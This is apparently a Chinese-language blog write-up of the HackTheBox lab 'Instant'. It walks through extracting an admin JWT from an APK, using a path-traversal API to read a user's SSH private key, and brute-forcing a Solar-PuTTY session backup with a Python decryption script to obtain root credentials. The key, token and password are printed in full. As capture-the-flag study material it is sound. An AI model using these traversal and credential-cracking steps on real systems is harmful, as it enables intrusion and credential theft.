---
title: '[Htb] Insant'
date: 2024-11-27 13:58 +0800
categories: [hack,HackTheBox]
tags: [apk,putty_session]
---

# 一，信息收集

1. **端口扫描**

   ```shell
   ╰─$ nmap -F instant.htb
   Starting Nmap 7.95 ( https://nmap.org ) at 2024-11-27 15:36 CST
   Nmap scan report for instant.htb (10.10.11.37)
   Host is up (0.45s latency).
   Not shown: 98 closed tcp ports (conn-refused)
   PORT   STATE SERVICE
   22/tcp open  ssh
   80/tcp open  http
   ```

​		端口扫描发现开启`http`

2. **子域名爆破**

   ```shell
   ╰─$ gobuster vhost -u http://instant.htb/ -w ~/Documents/SecLists/Discovery/DNS/subdomains-top1million-110000.txt                                                       130 ↵
   ===============================================================
   Gobuster v3.6
   by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
   ===============================================================
   [+] Url:             http://instant.htb/
   [+] Method:          GET
   [+] Threads:         10
   [+] Wordlist:        /Users/bamuwe/Documents/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
   [+] User Agent:      gobuster/3.6
   [+] Timeout:         10s
   [+] Append Domain:   false
   ===============================================================
   Starting gobuster in VHOST enumeration mode
   ===============================================================
   ```

   ​	子域名爆破无果

3. **网站踩点**![image-20241127154336917](../assets/img/2024-11-27-%5BHtb%5D%20Instant.assets/image-20241127154336917.png)

   ​	是一个支付类型的网站，网站只有一个`Download`功能可以使用，下载下来是一个`apk`文件

4. **apk分析**![image-20241127154533347](../assets/img/2024-11-27-%5BHtb%5D%20Instant.assets/image-20241127154533347.png)

   > apk截图

   ​	抓包分析可以发现如下接口：	![image-20241127155308456](../assets/img/2024-11-27-%5BHtb%5D%20Instant.assets/image-20241127155308456.png)

   ​	实现注册登陆，账号信息，转账等功能，其中登陆成功后返回一个jwt作为身份认证，我们可以进一步到apk中分析。	![image-20241127155604422](../assets/img/2024-11-27-%5BHtb%5D%20Instant.assets/image-20241127155604422.png)

   > jadx搜索截图

   ​	通过对apk的分析，我们可以发现源码中存在一个`token`，同时存在一个`swagger-ui.instant.htb`的子域名。

   ```shell
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
   >> jwt_decode
   {
       "id": 1,
       "role": "Admin",
       "walId": "f0eca6e5-783a-471d-9d8f-0162cbc900db",
       "exp": 33259303656
   }
   ```

   ​	好耶😆，是*admin～*

   ​	然后我就陷入了非常尴尬的地步，因为一开始没注意到那个子域名，所以我一直在纠结拿到这个token好像除了转账没有任何作用，但是实际上这里的突破口在子域名中。

5. **查看子域名**![image-20241127160232000](../assets/img/2024-11-27-%5BHtb%5D%20Instant.assets/image-20241127160232000.png)

   > 子域名截图

   ​	这里暴露出了许多`api`，爽啦！彻底爽啦！

# 二，漏洞利用

1. `api`利用

   ​	我们利用其中的`api/v1/admin/read/log`这个接口，带上admin的token就可以使用，其中存在文件包含漏洞，封装成`sh`便于使用。

   ```shell
   curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=$1" -H "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"|jq
   ```

   ​	很快啊！没有闪！配合`/etc/passwd`很快就登上去了。

   ```shell
   ╭─bamuwe@Mac ~/Downloads
   ╰─$ ./send.sh ../../../../home/shirohige/.ssh/id_rsa |ggrep -Po '(?<=").+(?=\\n)'
     % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                    Dload  Upload   Total   Spent    Left  Speed
   100  2833  100  2833    0     0   1229      0  0:00:02  0:00:02 --:--:--  1230
   -----BEGIN OPENSSH PRIVATE KEY-----
   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
   -----END OPENSSH PRIVATE KEY-----
   ```

# 三，权限提升

1. **网站`/opt`目录下存在一个`Solar-PuTTY`的`session`**

   ```shell
   shirohige@instant:/opt/backups/Solar-PuTTY$ cat sessions-backup.dat
   ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=
   ```

2. **破解`session`**

   ​	搜索发现解密脚本，附上链接:

   ```python
   import base64
   import sys
   from Crypto.Cipher import DES3
   from Crypto.Protocol.KDF import PBKDF2
   
   def decrypt(passphrase, ciphertext):
       data = ''
       try:
           # Decode the base64 encoded ciphertext
           array = base64.b64decode(ciphertext)
           salt = array[:24]
           iv = array[24:32]
           encrypted_data = array[48:]
   
           # Derive the key using PBKDF2
           key = PBKDF2(passphrase, salt, dkLen=24, count=1000)
   
           # Create the Triple DES cipher in CBC mode
           cipher = DES3.new(key, DES3.MODE_CBC, iv)
   
           # Decrypt the data
           decrypted_data = cipher.decrypt(encrypted_data)
   
           # Remove padding (PKCS7 padding)
           padding_len = decrypted_data[-1]
           decrypted_data = decrypted_data[:-padding_len]
   
           data = ''.join(chr(c) for c in decrypted_data if chr(c).isascii())
   
       except Exception as e:
           print(f'Error: {e}')
   
       return data
   
   if len(sys.argv) < 3:
       print(f'Usage: {sys.argv[0]} putty_session.dat wordlist.txt')
       exit(1)
   
   with open(sys.argv[1]) as f:
       cipher = f.read()
   
   with open(sys.argv[2]) as passwords:
       for i, password in enumerate(passwords):
           password = password.strip()
           decrypted = decrypt(password, cipher)
           print(f'[{i}] {password=}', end='\r')
           if 'Credentials' in decrypted:
               print(f'\r[{i}] {password=} {" " * 10}')
               print()
               print(decrypted)
               break
   ```

   > https://gist.githubusercontent.com/xHacka/052e4b09d893398b04bf8aff5872d0d5/raw/8e76153cd2d115686a66408f6e2deff7d3740ecc/SolarPuttyDecrypt.py

3. **own!**

   ```shell
   ╭─bamuwe@Mac ~/Downloads
   ╰─$ python3 dec.py session ~/Documents/rockyou.txt
   [103] password='estrella'
   
   {"Sessions":[{"Id":"066894ee-635c-4578-86d0-d36d4838115b","Ip":"10.10.11.37","Port":22,"ConnectionType":1,"SessionName":"Instant","Authentication":0,"CredentialsID":"452ed919-530e-419b-b721-da76cbe8ed04","AuthenticateScript":"00000000-0000-0000-0000-000000000000","LastTimeOpen":"0001-01-01T00:00:00","OpenCounter":1,"SerialLine":null,"Speed":0,"Color":"#FF176998","TelnetConnectionWaitSeconds":1,"LoggingEnabled":false,"RemoteDirectory":""}],"Credentials":[{"Id":"452ed919-530e-419b-b721-da76cbe8ed04","CredentialsName":"instant-root","Username":"root","Password":"12**24nzC!r0c%q12","PrivateKeyPath":"","Passphrase":"","PrivateKeyContent":null}],"AuthScript":[],"Groups":[],"Tunnels":[],"LogsFolderDestination":"C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"}
   ```

# 四，总结

- 渗透的本质是信息收集，好的信息收集是成功的一半，在这个靶机体现的非常到位。同时也想吐槽一下，mac上的安卓模拟器（mumu）一定要开vip才给用有点难受了，好兄弟们有什么好的平替send to my email please～
